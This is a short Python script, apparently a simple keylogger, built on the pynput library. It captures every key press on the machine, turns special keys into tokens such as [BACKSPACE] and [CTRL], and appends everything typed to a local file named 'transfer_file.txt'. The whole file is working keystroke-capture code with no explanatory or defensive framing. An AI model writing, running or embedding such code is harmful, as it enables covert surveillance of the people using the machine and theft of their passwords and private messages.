from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'", "")
    
    if letter == "Key.space":
        letter = " "
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.backspace":
        letter = " [BACKSPACE] "
    if letter == "Key.shift":
        letter = ""
    if letter == "Key.shift_r":
        letter = ""
    if letter == "Key.tab":
        letter = " [TAB] "
    if letter == "Key.ctrl_l":
        letter = " [CTRL] "
    if letter == "Key.ctrl_r":
        letter = " [CTRL] "
    if letter == "Key.alt_l":
        letter = " [ALT] "
    if letter == "Key.alt_gr":
        letter = " [ALT] "
        
    with open("transfer_file.txt", "a") as f:
        f.write(letter)
    
with Listener(on_press=writetofile) as listener:

    listener.join()
